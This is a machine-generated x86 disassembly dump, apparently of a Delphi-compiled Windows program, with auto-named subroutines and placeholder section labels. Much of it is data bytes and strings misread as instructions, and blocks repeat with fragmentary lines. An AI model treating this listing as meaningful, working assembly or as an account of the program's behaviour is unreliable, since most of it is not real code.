add [ ecx + ebp * 8 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ eax ] al
call sub_40e7fa
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea01
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40ea93
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413cc0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413cc0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea9a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fc0
retn
dec ebp
in al 0x8b
mov ebx eax
popad
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e9 ] bl
add [ eax ] al
add [ eax - 0x6bffbf86 ] bh
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
call 0x4ce8e6
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
outsd
push 0x0
xor eax eax
push ebp
push sub_40e9fa
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
inc eax
add [ eax ] al
lea eax [ eax ]
xor al 0xe9
jmp r-xdata
add [ eax ] al
add [ eax ] al
outsd
popad
outsb
je r-xdata
jns r-xdata
sub_40e429
mov ebx 0x589e41a6
jg r-xdata
add al 0x8b
add bh bh
and [ ebx - 0xbfbdbbc ] al
jmp r-xdata
push ss
mov esi 0xe4042deb
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp fs
inc eax
add [ eax ] ah
in al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
in al 0x40
add [ eax ] dl
add [ eax ] al
add [ edx + 0x34940040 ] dh
inc eax
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add al ch
push eax
inc ecx
add [ edx + edx * 2 ] bh
inc ecx
add [ eax + 0x51 ] bh
inc ecx
add [ ecx + edx * 2 + 0x518c0041 ] ch
inc ecx
add [ eax + 0x74004155 ] bl
push ecx
inc ecx
add [ ecx * 2 + 0x4d540041 ] bl
inc ecx
add al ah
dec ebp
inc ecx
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ eax ] dl
dec ebp
inc ecx
add al al
push ecx
inc ecx
add [ eax - 0x63ffbeb3 ] ch
dec ebp
inc ecx
add [ edx + edx * 2 + 0x585c0041 ] al
inc ecx
add [ eax + 0x58 ] ch
inc ecx
add [ eax + ebx * 2 + 0x41 ] al
add [ eax + 0x58 ] dl
inc ecx
add [ esi ] dl
push esp
dec ecx
outsb
jbe r-xdata
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
jo r-xdata
imul esp [ ebp + 0x61 ] 0x62
insb
push esi
in al 0x31
jb r-xdata
outsd
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40 ] ch
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
out 0x40 al
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
popad
jb r-xdata
push esi
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
movsb [ edi ] [ esi ]
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0xc0040 ] ah
jb r-xdata
jns r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
out 0x40 al
outsd
jb r-xdata
inc ecx
jb r-xdata
insb
outsd
ja r-xdata
jo r-xdata
popad
outsb
je r-xdata
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
in eax 0x40
add [ eax + eax ] cl
nop
inc eax
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1b ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ esi ] dl
inc ebp
push esi
popad
adc eax 0x72615645
jns r-xdata
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
outsb
jbe r-xdata
ror [ eax ] 0xe6
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
inc ebp
jb r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
popad
jae r-xdata
inc ebx
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
add [ esp + esi + 0x31e40040 ] bl
outsb
jbe r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ 0x72615645 ] dl
out 0x40 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xe7
outsd
jb r-xdata
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl dh 0x1
inc eax
outsd
jb r-xdata
jns r-xdata
jb r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
out 0x40 eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
movsb [ edi ] [ esi ]
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
out 0x40 al
popad
outsb
je r-xdata
shr [ esi + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
jb r-xdata
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
jb r-xdata
rcr [ eax + 0x40e7 ] 0x0
inc eax
add [ edx + esi ] bh
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
in al 0x31
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
inc eax
add ah cl
call sub_40e8c6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
popad
jb r-xdata
popad
jns r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
insd
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
jb r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
add [ eax ] al
jb r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ edx + esi ] bh
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ eax - 0x18 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
outsd
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
cwde
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ ecx + ebp * 8 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ eax ] al
call sub_40e7fa
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea01
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40ea93
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413cc0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413cc0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea9a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fc0
retn
dec ebp
in al 0x8b
mov ebx eax
popad
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e9 ] bl
add [ eax ] al
add [ eax - 0x6bffbf86 ] bh
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
call 0x4ce8e6
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
outsd
push 0x0
xor eax eax
push ebp
push sub_40e9fa
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
inc eax
add [ eax ] al
lea eax [ eax ]
xor al 0xe9
jmp r-xdata
add [ eax ] al
add [ eax ] al
outsd
popad
outsb
je r-xdata
jns r-xdata
sub_40e7fa
inc eax
add [ edx + esi ] bh
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsb
je r-xdata
popad
in al 0x31
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
insd
inc eax
add ah cl
call sub_40e8c6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
popad
add [ edx + esi ] bh
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jne r-xdata
jb r-xdata
inc ebp
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
cwde
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ ecx + ebp * 8 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
outsd
jb r-xdata
jo r-xdata
popad
je r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea01
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40ea93
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413cc0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413cc0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea9a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fc0
retn
dec ebp
in al 0x8b
mov ebx eax
popad
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e9 ] bl
add [ eax ] al
add [ eax - 0x6bffbf86 ] bh
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc ebp
jb r-xdata
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
push 0x0
xor eax eax
push ebp
push sub_40e9fa
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
inc eax
add [ eax ] al
lea eax [ eax ]
xor al 0xe9
jmp r-xdata
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
call 0x4ce8e6
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
outsd
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc eax
add [ eax - 0x18 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
outsd
jb r-xdata
dec ecx
inc eax
add [ eax ] al
call sub_40e7fa
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
outsd
jb r-xdata
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
jb r-xdata
popad
outsb
je r-xdata
rcr [ eax + 0x40e7 ] 0x0
jb r-xdata
popad
jns r-xdata
outsb
js r-xdata
movsb [ edi ] [ esi ]
popad
push esi
popad
jb r-xdata
add [ eax ] al
jb r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
adc eax 0x72615645
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
out 0x40 eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
outsd
jb r-xdata
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ 0x72615645 ] dl
out 0x40 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
sub_40e8c6
inc eax
add [ edx + esi ] bh
outsb
je r-xdata
popad
outsb
je r-xdata
add [ edx + esi ] bh
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jne r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
cwde
dec edi
dec bp
insd
outsd
jb r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea01
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40ea93
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413cc0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413cc0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea9a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fc0
retn
dec ebp
in al 0x8b
mov ebx eax
popad
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e9 ] bl
add [ eax ] al
add [ eax - 0x6bffbf86 ] bh
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc ebp
jb r-xdata
push 0x0
xor eax eax
push ebp
push sub_40e9fa
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
lea eax [ eax ]
xor al 0xe9
jmp r-xdata
add [ eax ] al
add [ eax ] al
outsd
je r-xdata
inc eax
add [ eax ] al
inc eax
add [ ecx + ebp * 8 ] dh
inc eax
insd
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
outsd
jb r-xdata
jb r-xdata
inc eax
add ah cl
call sub_40e8c6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
popad
jns r-xdata
inc eax
